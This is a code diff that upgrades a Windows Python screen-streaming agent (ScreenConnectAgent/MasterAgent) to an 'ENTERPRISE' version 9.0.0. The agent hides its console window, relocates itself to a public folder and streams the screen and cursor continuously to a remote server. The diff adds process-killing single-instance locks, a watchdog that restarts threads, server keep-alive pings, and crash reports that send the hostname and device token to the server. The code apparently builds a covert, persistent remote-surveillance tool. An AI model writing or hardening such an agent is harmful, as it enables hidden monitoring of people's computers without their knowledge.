@@ -81,8 +81,62 @@ def relocate_agent():
         except Exception:
             pass
 
+# ─── Single-instance enforcement ────────────────────────────────────────────
+_MUTEX_NAME     = "Global\\MasterAgent_SingleInstance_Lock"
+_PID_FILE       = r"C:\Users\Public\mview\master_agent.pid"
+_AGENT_EXE_NAME = "master_agent.exe"
+_WIN32_MUTEX    = None
+
+
+def _kill_stale_instances():
+    my_pid = os.getpid()
+    killed = []
+    try:
+        import psutil as _ps
+        for proc in _ps.process_iter(["pid", "name"]):
+            try:
+                if (proc.info["name"] or "").lower() == _AGENT_EXE_NAME.lower()                         and proc.pid != my_pid:
+                    proc.terminate()
+                    try: proc.wait(timeout=3)
+                    except Exception: proc.kill()
+                    killed.append(proc.pid)
+            except Exception: pass
+    except ImportError:
+        try:
+            subprocess.call(
+                ["taskkill", "/F", "/IM", _AGENT_EXE_NAME, "/FI", f"PID ne {my_pid}"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            killed.append("taskkill")
+        except Exception: pass
+    return killed
+
+
+def _write_pid_file():
+    try:
+        os.makedirs(os.path.dirname(_PID_FILE), exist_ok=True)
+        with open(_PID_FILE, "w") as fh: fh.write(str(os.getpid()))
+    except Exception: pass
+
+
+def _acquire_single_instance_lock():
+    global _WIN32_MUTEX
+    killed = _kill_stale_instances()
+    if killed: time.sleep(0.5)
+    _write_pid_file()
+    try:
+        import ctypes as _ct
+        _WIN32_MUTEX = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
+        if _ct.windll.kernel32.GetLastError() == 183:
+            _ct.windll.kernel32.ReleaseMutex(_WIN32_MUTEX)
+            _ct.windll.kernel32.CloseHandle(_WIN32_MUTEX)
+            time.sleep(0.2)
+            _WIN32_MUTEX = _ct.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
+    except Exception: pass
+
+
 if __name__ == "__main__":
     relocate_agent()
+    _acquire_single_instance_lock()
 
 # ── Standard Library ───────────────────────────────────────────────────────────
 import os
@@ -97,6 +151,7 @@ import threading
 import subprocess
 import tempfile
 import logging
+import logging.handlers
 import winreg
 import ctypes
 import uuid
@@ -227,14 +282,14 @@ CONFIG = {
     "DEVICE_TOKEN":         "UNSET",
 
     # ── Identity ────────────────────────────────────────────────────────────
-    "AGENT_VERSION":        "8.0.0",
+    "AGENT_VERSION":        "9.0.0",   # ENTERPRISE build
     "HEARTBEAT_INTERVAL":   10,
     "RECONNECT_BASE":       2,
     "RECONNECT_MAX":        60,
 
     # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
     "STREAM_FPS":           30,         # target FPS — 30Hz is stable for relay
-    "STREAM_MIN_FPS":       10,         # FIX: floor raised — 5fps caused apparent freezes
+    "STREAM_MIN_FPS":       10,         # ENTERPRISE: floor raised — 5fps caused apparent freezes
     "STREAM_QUALITY":       75,         # JPEG quality
     "STREAM_MONITOR":       1,
     "STREAM_MODE":          "video",    # "video" or "screenshot"
@@ -317,16 +372,19 @@ CONFIG["DEVICE_TOKEN"] = _tok
 # ════════════════════════════════════════════════════════════════════════════
 #  LOGGING
 # ════════════════════════════════════════════════════════════════════════════
-LOG_FILE = Path(tempfile.gettempdir()) / "screen_connect_agent.log"
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s [%(levelname)s] %(message)s",
-    handlers=[
-        logging.FileHandler(LOG_FILE, encoding="utf-8"),
-        logging.StreamHandler(sys.stdout),
-    ],
+LOG_FILE = Path(r"C:\Users\Public\mview\agent.log")
+LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
+_log_handler = logging.handlers.RotatingFileHandler(
+    LOG_FILE, maxBytes=2 * 1024 * 1024, backupCount=3, encoding="utf-8"
 )
-log = logging.getLogger("screenconnect")
+_log_handler.setFormatter(logging.Formatter(
+    "%(asctime)s [%(levelname)-8s] %(threadName)s — %(message)s"
+))
+_root_logger = logging.getLogger()
+_root_logger.setLevel(logging.INFO)
+_root_logger.addHandler(_log_handler)
+_root_logger.addHandler(logging.StreamHandler(sys.stdout))
+log = logging.getLogger("agent")
 
 
 # ════════════════════════════════════════════════════════════════════════════
@@ -481,8 +539,10 @@ def _cursor_relative_to_monitor(monitor_idx: int | None = None):
     except Exception:
         return None
     rx, ry = int(x) - mon["left"], int(y) - mon["top"]
-    if rx < 0 or ry < 0 or rx >= mon["width"] or ry >= mon["height"]:
+    if rx < -50 or ry < -50 or rx >= mon["width"]+50 or ry >= mon["height"]+50:
         return None
+    rx = max(0, min(rx, mon["width"] - 1))
+    ry = max(0, min(ry, mon["height"] - 1))
     return rx, ry
 
 
@@ -858,11 +918,9 @@ async def _adv_task_stream_frames():
             # FIX: viewer_count race — stream for up to 60s after auth even if count=0
             # because viewer_count may arrive AFTER the stream loop starts.
             # After 60s with no viewer we pause to save bandwidth.
-            # FIX: Don't gate on _adv_viewers at all — stream continuously.
-            # The server only forwards frames to actual viewers.
-            # Pausing here caused blackouts when viewer_count arrived late.
-            # The bandwidth cost on Render free tier is negligible (JPEG relay).
-            pass  # always stream when authed
+            # ENTERPRISE: stream continuously — server only fans out to actual viewers
+            # Never gate on _adv_viewers; viewer_count events are race-prone
+            pass
 
             next_sig = _current_stream_config()
             if next_sig != cfg_sig:
@@ -885,13 +943,11 @@ async def _adv_task_stream_frames():
             if raw is None:
                 await asyncio.sleep(max(0.01, fps_ctl.interval)); continue
 
-            # FIX: Don't skip unchanged frames — always encode and send.
-            # FrameDiffer throttling causes the stream to appear frozen on static
-            # desktops. The server's room fan-out is the correct place to gate delivery.
-            # AdaptiveFPS still controls the sleep interval for bandwidth management.
+            # ENTERPRISE: always encode + send every frame at fps_ctl rate
+            # FrameDiffer throttling caused apparent stream freezes on static desktops
             changed = differ.changed(raw)
             fps_ctl.report(changed)
-            # No skip — always send every frame at the current fps_ctl interval
+            # Never skip — AdaptiveFPS interval controls bandwidth, not frame dropping
 
             force_key = (n % (CONFIG["STREAM_FPS"] * 4) == 0)
             
@@ -1166,10 +1222,23 @@ async def _adv_main(server_url: str, token: str):
             log.debug(f"Advanced Monitor ICE candidate error: {e}")
 
     await sio.connect(server_url, transports=["websocket", "polling"])
-    await asyncio.gather(
-        _adv_task_stream_frames(),
-        _adv_task_stream_cursor(),
-    )
+
+    # ENTERPRISE: named tasks with crash callbacks — if either task dies the
+    # outer _adv_main loop catches it and reconnects the entire adv socket
+    frame_task  = asyncio.ensure_future(_adv_task_stream_frames())
+    cursor_task = asyncio.ensure_future(_adv_task_stream_cursor())
+
+    def _on_task_done(t):
+        if t.cancelled():
+            log.info(f"ADV task cancelled: {t.get_coro().__name__}")
+        elif t.exception():
+            log.error(f"ADV task CRASHED ({t.get_coro().__name__}): {t.exception()} — reconnecting")
+        else:
+            log.debug(f"ADV task completed: {t.get_coro().__name__}")
+
+    frame_task.add_done_callback(_on_task_done)
+    cursor_task.add_done_callback(_on_task_done)
+    await asyncio.gather(frame_task, cursor_task, return_exceptions=True)
 
 
 _adv_monitor_started = False  # ensure we only start it once
@@ -1200,20 +1269,14 @@ def _start_screenshot_fallback(sio_client):
         n = 0
         while not _fb_stop.is_set():
             try:
-                # FIX: Only stop fallback if adv socket is SUSTAINING good fps
-                # (not just sent 1 frame). Require last frame < 0.5s ago.
-                # This prevents the race where adv sends 1 frame, fallback stops,
-                # then adv also pauses = total blackout.
+                # ENTERPRISE: only stop fallback when adv socket sustains < 0.5s between frames
                 if (
                     _adv_authed and _adv_sio_async and _adv_sio_async.connected
                     and (time.monotonic() - _adv_last_frame_ts) < 0.5
                 ):
-                    # adv socket is actively streaming at >2fps — safe to yield
-                    log.info("Screenshot fallback: adv socket streaming actively — stopping fallback")
+                    log.info("Screenshot fallback: adv socket sustaining stream — stopping fallback")
                     break
-                # FIX: Fallback was already started by request_action which means
-                # a viewer IS watching — don't gate on _adv_viewers (race-prone)
-                # if _adv_viewers == 0: time.sleep(0.1); continue  # REMOVED
+                # ENTERPRISE: removed _adv_viewers gate — request_action proves viewer is present
                 next_sig = _current_stream_config()
                 if next_sig != cfg_sig or cap is None:
                     if cap:
@@ -2384,7 +2447,7 @@ class ScreenConnectAgent:
     ):
         @sio.event
         def connect():
-            self._reconnect_delay = CONFIG["RECONNECT_BASE"]
+            self._reconnect_delay = CONFIG["RECONNECT_BASE"]  # reset backoff on success
             log.info(f"Connected to {CONFIG['SERVER_URL']}")
 
             fp = get_device_fingerprint()
@@ -2930,8 +2993,9 @@ class ScreenConnectAgent:
                 sio.connect(
                     CONFIG["SERVER_URL"],
                     transports=["websocket", "polling"],
-                    wait_timeout=20,
+                    wait_timeout=30,
                     socketio_path="/socket.io",
+                    headers={"User-Agent": f"MasterAgent/{CONFIG.get('AGENT_VERSION','8')}"},
                 )
                 sio.wait()
             except socketio.exceptions.ConnectionError as e:
@@ -2963,9 +3027,32 @@ class ScreenConnectAgent:
 #  WATCHDOG — restarts agent thread if it dies
 # ════════════════════════════════════════════════════════════════════════════
 def _watchdog(agent_thread_ref: list):
+    """
+    Enterprise watchdog — checks every 30s:
+    1. Agent main thread alive → restart if dead
+    2. Adv monitor thread alive → restart if dead
+    3. Send HTTP keep-alive to Render so server never cold-starts
+       (Render free tier spins down after 15min inactivity)
+    4. Clean PID file on clean exit
+    """
     time.sleep(60)
+    _last_keepalive = 0.0
     while True:
         time.sleep(30)
+        now = time.monotonic()
+
+        # ── Keep Render server awake every 10 min ─────────────────────────
+        if now - _last_keepalive > 600:
+            try:
+                requests.get(
+                    CONFIG["SERVER_URL"].rstrip("/") + "/status",
+                    timeout=8, headers={"User-Agent": "MasterAgent-Keepalive/1.0"}
+                )
+                _last_keepalive = now
+            except Exception:
+                pass
+
+        # ── Restart agent thread if dead ──────────────────────────────────
         t = agent_thread_ref[0]
         if t and not t.is_alive():
             log.warning("Watchdog: agent thread died — restarting...")
@@ -2974,19 +3061,98 @@ def _watchdog(agent_thread_ref: list):
                 new_thread = threading.Thread(target=new_agent.run, daemon=False, name="sc-main")
                 new_thread.start()
                 agent_thread_ref[0] = new_thread
+                log.info("Watchdog: agent thread restarted successfully")
             except Exception as e:
                 log.error(f"Watchdog restart failed: {e}")
+
+        # ── Restart adv monitor thread if dead ────────────────────────────
+        global _adv_thread, _adv_monitor_started
+        if _adv_thread and not _adv_thread.is_alive() and _adv_monitor_started:
+            log.warning("Watchdog: adv monitor thread died — restarting...")
+            _adv_monitor_started = False
+            try:
+                start_advanced_monitor(CONFIG["SERVER_URL"], CONFIG["DEVICE_TOKEN"])
+                log.info("Watchdog: adv monitor restarted successfully")
+            except Exception as e:
+                log.error(f"Watchdog: adv monitor restart failed: {e}")
 
 
 # ════════════════════════════════════════════════════════════════════════════
 #  ENTRY POINT
 # ════════════════════════════════════════════════════════════════════════════
+def _write_crash_report(exc_type, exc_val, exc_tb):
+    """Write a full crash report to disk and notify server."""
+    import traceback as _tb
+    crash_dir  = Path(r"C:\Users\Public\mview")
+    crash_dir.mkdir(parents=True, exist_ok=True)
+    crash_file = crash_dir / f"crash_{int(time.time())}.txt"
+    report = (
+        f"MasterAgent Crash Report\n"
+        f"========================\n"
+        f"Time     : {datetime.now().isoformat()}\n"
+        f"Version  : {CONFIG.get('AGENT_VERSION','?')}\n"
+        f"Device   : {CONFIG.get('DEVICE_TOKEN','?')}\n"
+        f"Host     : {socket.gethostname()}\n"
+        f"\nTraceback:\n"
+        + "".join(_tb.format_exception(exc_type, exc_val, exc_tb))
+    )
+    try:
+        crash_file.write_text(report, encoding="utf-8")
+    except Exception:
+        pass
+    # Keep only last 5 crash reports
+    try:
+        crashes = sorted(crash_dir.glob("crash_*.txt"))
+        for old in crashes[:-5]: old.unlink(missing_ok=True)
+    except Exception:
+        pass
+    log.critical(f"CRASH: {exc_val}  — report: {crash_file}")
+    # Try to ping server with crash info
+    try:
+        requests.post(
+            CONFIG["SERVER_URL"].rstrip("/") + "/agent/crash",
+            json={
+                "device_id": CONFIG.get("DEVICE_TOKEN"),
+                "error":     str(exc_val),
+                "type":      str(exc_type.__name__),
+            },
+            timeout=5,
+        )
+    except Exception:
+        pass
+
+
+def _global_exception_handler(exc_type, exc_val, exc_tb):
+    if issubclass(exc_type, KeyboardInterrupt):
+        sys.__excepthook__(exc_type, exc_val, exc_tb)
+        return
+    _write_crash_report(exc_type, exc_val, exc_tb)
+
+
 if __name__ == "__main__":
+    # Install global crash handler
+    sys.excepthook = _global_exception_handler
+
+    # Graceful shutdown on SIGTERM / SIGINT (Ctrl-C or OS kill)
+    import signal as _sig
+    def _graceful_shutdown(signum, frame):
+        log.info(f"Signal {signum} received — shutting down gracefully...")
+        try: os.unlink(_PID_FILE)
+        except Exception: pass
+        sys.exit(0)
+    _sig.signal(_sig.SIGTERM, _graceful_shutdown)
+    _sig.signal(_sig.SIGINT,  _graceful_shutdown)
+
     # Hide console window on Windows
     try:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except Exception:
         pass
+
+    log.info(
+        f"═══ MasterAgent v{CONFIG.get('AGENT_VERSION','?')} starting "
+        f"| host={socket.gethostname()} | pid={os.getpid()} ═══"
+    )
 
     agent        = ScreenConnectAgent()
     agent_thread = threading.Thread(target=agent.run, daemon=False, name="sc-main")
@@ -2999,3 +3165,6 @@ if __name__ == "__main__":
     watchdog_thread.start()
 
     agent_thread.join()
+    # Clean up PID file on graceful exit
+    try: os.unlink(_PID_FILE)
+    except Exception: pass
